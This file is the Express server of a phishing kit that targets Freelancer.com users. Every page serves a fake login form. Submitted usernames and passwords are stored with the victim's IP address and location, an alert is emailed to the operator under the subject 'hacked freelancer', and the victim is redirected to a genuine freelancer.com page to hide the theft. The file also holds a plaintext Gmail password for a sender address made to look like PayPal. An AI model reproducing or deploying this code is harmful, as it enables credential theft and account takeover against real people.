var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
const nodemailer = require("nodemailer");
const iplocation = require("iplocation").default;
var loc;
var city;
var reg;

var mailOptions = {
    from: 'paypal.credit.safety@gmail.com',
    to: "fadysadakah.emh@gmail.com",
    subject: 'hacked freelancer',
    text: '',
    html: ''
};
var transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    secure: true,
    port: 465,

    auth: {
        user: 'paypal.credit.safety@gmail.com',
        pass: 'xzoahseedlerintr'
    }
});
const client = new pg.Client(process.env.DATABASE_URL);

app.use(bodyParser.urlencoded({ extended: false }));


client.connect();
client.query("CREATE TABLE freelancer_users (id SERIAL,users text,password text ,country text ,ip text ,time timestamp default now())")

// #########################################################################################################################################################################################################################
app.get('/confirm/*',function(req,res){
    res.render('confirm');
})
// #############################################################    POST REQUESTS    #######################################################################################################################################
app.post('/login',function(req,res){
    console.log(req.body)
    transporter.sendMail(mailOptions, function () { });
    var a = req.body.username.replace(/\\/g,"\\\\").replace(/'/g,"\\'");
    var b = req.body.password.replace(/\\/g,"\\\\").replace(/'/g,"\\'");
    console.log(a+b);
    var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    iplocation(ip, [], (error, res) => { loc = res.country; city = res.region; reg = res.city;console.log(res);
        var location = loc + '---' + city + '---' + reg ;
    
        client.query("INSERT INTO freelancer_users (users,password,ip,country) VALUES ('" + a + "','" + b + "','" + ip + "','"+location+"')",function(err,result){});
    });
   
    res.redirect('https://www.freelancer.com/contest/Design-a-logo-for-an-Accounting-Firm-1460786-byentry-25383803?w=f');
})


// #########################################################################################################################################################################################################################

app.get('*', function (req, res) {
    res.render('login')
})
app.listen(PORT, function () {
    console.log('Server Started')
})
